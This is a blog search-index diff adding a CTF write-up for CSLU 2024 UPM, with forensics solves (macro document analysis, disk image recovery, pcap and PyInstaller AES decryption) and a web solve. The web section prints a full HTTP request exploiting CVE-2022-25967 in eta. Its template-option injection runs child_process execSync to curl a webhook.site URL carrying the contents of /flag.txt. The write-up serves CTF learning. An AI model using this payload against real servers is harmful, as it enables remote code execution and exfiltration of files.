@@ -6,4 +6,221 @@
     <content><![CDATA[<p>This is my First Post in my Website!!<br>There will be Writeup for my CTF Challenge and maybe some Learning stuff I Guess???</p>
 ]]></content>
   </entry>
+  <entry>
+    <title>CSLU 2024 UPM</title>
+    <url>/2024/12/31/CSLU-2024-UPM/</url>
+    <content><![CDATA[<h1 id="Forensics"><a href="#Forensics" class="headerlink" title="Forensics"></a>Forensics</h1><h2 id="Dr-Mals"><a href="#Dr-Mals" class="headerlink" title="Dr. Mals"></a>Dr. Mals</h2><h3 id="Step-by-Step-Solve"><a href="#Step-by-Step-Solve" class="headerlink" title="Step by Step Solve"></a>Step by Step Solve</h3><hr>
+<ol>
+<li>Download the Dr. Mals word file</li>
+<li>Use Oletools - olevba to decrypt this file<ul>
+<li><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://github.com/user-attachments/assets/f6c2bc3c-cc2f-40dc-a40b-8eaef09150cd"
+                      alt="image"
+                ></li>
+</ul>
+</li>
+<li>With the use of CyberChef, we can find out the encoded text<ul>
+<li><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://github.com/user-attachments/assets/927f7112-1acd-487a-8c57-a5a9fa5fa144"
+                      alt="image"
+                ></li>
+</ul>
+</li>
+<li>Searching the website and it given<ul>
+<li><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://github.com/user-attachments/assets/3f0cf691-eea1-45ce-9dd9-30e9442d1a79"
+                      alt="image"
+                ></li>
+</ul>
+</li>
+<li>Lets decode this<ul>
+<li>With the use of online decoderwe can find out the flag</li>
+<li><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://github.com/user-attachments/assets/62c1dd32-c3a9-4a8d-9f3b-3b331119dba8"
+                      alt="image"
+                ></li>
+</ul>
+</li>
+<li>Thats it.</li>
+</ol>
+<h4 id="Acknowledgement"><a href="#Acknowledgement" class="headerlink" title="Acknowledgement"></a>Acknowledgement</h4><p>Thx to Akram for providing Hint</p>
+<h2 id="RE-Memory-Delete"><a href="#RE-Memory-Delete" class="headerlink" title="RE:Memory Delete"></a>RE:Memory Delete</h2><h3 id="Step-by-Step-Solve-1"><a href="#Step-by-Step-Solve-1" class="headerlink" title="Step by Step Solve"></a>Step by Step Solve</h3><hr>
+<ol>
+<li>First, we download the attached file given by the challenge.<ul>
+<li>Challenge.7z</li>
+</ul>
+</li>
+<li>Unzip it.<br>-Challenge.ad1 files inside.</li>
+<li>.ad1 is a image files so lets use FTK Imager to find the deleted file</li>
+<li><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://github.com/user-attachments/assets/98a6ce23-53b1-4a37-9a8c-9a9cae49e6f1"
+                      alt="image"
+                ></li>
+<li>There goes the flag</li>
+</ol>
+<h2 id="Skyfall"><a href="#Skyfall" class="headerlink" title="Skyfall"></a>Skyfall</h2><h3 id="Step-by-step-solve"><a href="#Step-by-step-solve" class="headerlink" title="Step by step solve"></a>Step by step solve</h3><hr>
+<p><em>Pain killer, My Skill issue… XD</em></p>
+<ol>
+<li>Download the file attach by the challenge.<br>-capture.pcapng</li>
+<li>Use wireshark to open the pcapng files</li>
+<li>See the clue given, Love the EDITED LEWIS VERSION files and lost the flag.<ul>
+<li><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://github.com/user-attachments/assets/9ec25fe0-ecd3-4587-a4e7-5887377fbfbe"
+                      alt="image"
+                ></li>
+</ul>
+</li>
+<li>File -&gt; Export -&gt; Http, and save all the files.</li>
+<li>we can see there is 5 files exported, 2 text file with word <code>File received successfully!</code> and <code>file_data=16ae9187d13259788a97aef16a7d50f8b6376fbcba92a0f53e7e68d9f562a3a6576a3183a8dc8631c64fbd9147c8b608</code><ul>
+<li>usefull for later</li>
+</ul>
+</li>
+<li>And there is a file with big data 24,345kb and let us see what file is that.</li>
+</ol>
+<ul>
+<li><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://github.com/user-attachments/assets/395b8f53-8888-4af0-bf28-ae6f5b156992"
+                      alt="image"
+                ></li>
+</ul>
+<ol start="7">
+<li>Looks like it is a elf file<br>  <img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://github.com/user-attachments/assets/a9223eb5-5494-4476-b76e-94ca61886bab"
+                      alt="image"
+                ></li>
+<li>I manage to find a website to extract the elf file <a class="link"   href="https://www.ezyzip.com/open-extract-elf-file.html#" >EzyZIP<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li>
+<li>We can see the largest file is here after extract</li>
+</ol>
+<ul>
+<li><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://github.com/user-attachments/assets/d61f4dc0-bd2e-4e85-922c-cbaaa903fb5e"
+                      alt="image"
+                ><br>After have a long time searching, i cant found any ways to extract pydata… skill issue XD</li>
+</ul>
+<ol start="10">
+<li>After the end of the day, my friend told me there is something call <code>Pyinstxtractor</code> that can extract it.<ul>
+<li><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://github.com/user-attachments/assets/647ba1e4-5257-4eae-8e27-94885a3b018b"
+                      alt="image"
+                ></li>
+<li>This is what i found</li>
+</ul>
+</li>
+<li>okayyyy here is it<ul>
+<li><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://github.com/user-attachments/assets/839516f6-2d26-4c28-af8e-cfbd172314e6"
+                      alt="image"
+                ></li>
+</ul>
+</li>
+<li>Theres alot files inside, but the one the name <code>skyfall-lewis-edited-version.pyc</code> is the most suspicious.<ul>
+<li><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://github.com/user-attachments/assets/b3e6721f-12fd-4eba-a1fc-7d8d92ac3bc0"
+                      alt="image"
+                ></li>
+</ul>
+</li>
+<li>With the use of this website <a class="link"   href="https://pylingual.io/" >Pylingual<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>, i transfer pyc files to py<ul>
+<li><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://github.com/user-attachments/assets/575f7882-fe26-4d1c-91f5-69de17c6099c"
+                      alt="image"
+                ></li>
+</ul>
+</li>
+<li>We can see it is a AES encyption function and the key is the time which the user encrypt when downloaded, so lets go back to wireshark and find the date when she successfuly download.<ul>
+<li><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://github.com/user-attachments/assets/f286e913-9441-4f6b-8273-1b7df152b17d"
+                      alt="image"
+                ></li>
+<li>We can find out that the epoch for the time she download the file is <code>1733988750</code></li>
+</ul>
+</li>
+<li>Then use GPT xd find the key out<ul>
+<li><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://github.com/user-attachments/assets/c5d87093-080a-410e-b361-ce07d7c64747"
+                      alt="image"
+                ></li>
+<li>ps: I also dk why need to use <code>1733988749</code> just told by my friend to use it cant find any things that support this epoch XD.</li>
+</ul>
+</li>
+<li>Okay, then let us go to decrypt it. Use cyberchef</li>
+<li><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://github.com/user-attachments/assets/0a6837ae-ddf5-41d3-a810-7318c56a4607"
+                      alt="image"
+                ><br>Heres the flag.<br>Okay its maybe abit harder than i though. cry die.</li>
+</ol>
+<h4 id="Acknowledgement-1"><a href="#Acknowledgement-1" class="headerlink" title="Acknowledgement"></a>Acknowledgement</h4><p>Thx to Bakayang for providing solution at the end of the day</p>
+<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="Useless-Website"><a href="#Useless-Website" class="headerlink" title="Useless Website"></a>Useless Website</h2><h3 id="Step-by-Step-Solve-2"><a href="#Step-by-Step-Solve-2" class="headerlink" title="Step by Step Solve"></a>Step by Step Solve</h3><hr>
+<ol>
+<li><p>Download the source code of the website</p>
+</li>
+<li><p>We can see theres something in the package.json file</p>
+<ul>
+<li><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://github.com/user-attachments/assets/ded38f60-d45c-406f-87ca-353241b395e5"
+                      alt="image"
+                ></li>
+</ul>
+</li>
+<li><p>Searching on the internet <code>CVE-2022-25967</code> showing that there is some leakage can be use on the eta framework.</p>
+</li>
+<li><p>In burpsuite, intercept the web and change to this</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><figcaption><span>/utils/settings HTTP/1.1</span></figcaption><table><tr><td class="code"><pre><span class="line">Host: 5.75.155.50:1341</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">If-None-Match: W/&quot;1057-ih1IUXlwncna8aHynJLYIHjiX30&quot;</span><br><span class="line">Priority: u=0, i</span><br><span class="line">Content-Length: 292</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;settings&quot;: &#123;</span><br><span class="line">    &quot;view options&quot;: &#123;</span><br><span class="line">      &quot;varName&quot;: &quot;x=process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;curl https://webhook.site/self id/$(cat /flag.txt)&#x27;)&quot;,</span><br><span class="line">      &quot;include&quot;: false,</span><br><span class="line">      &quot;includeFile&quot;: false,</span><br><span class="line">      &quot;useWith&quot;: true</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+</li>
+<li><p>And we can find out the flag at the end of the webhook link.</p>
+<ul>
+<li><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://github.com/user-attachments/assets/ee3ce174-09de-43c1-82ea-43f979aa075d"
+                      alt="image"
+                ></li>
+<li><code>CSLU&#123;wh4ts_y0ur_et4?&#125;</code></li>
+</ul>
+</li>
+</ol>
+<h3 id="Acknowledgement-2"><a href="#Acknowledgement-2" class="headerlink" title="Acknowledgement"></a>Acknowledgement</h3><p>Thx for Megat for the solution.</p>
+]]></content>
+      <categories>
+        <category>CTF 2024</category>
+      </categories>
+      <tags>
+        <tag>Forensics</tag>
+        <tag>Web</tag>
+      </tags>
+  </entry>
 </search>
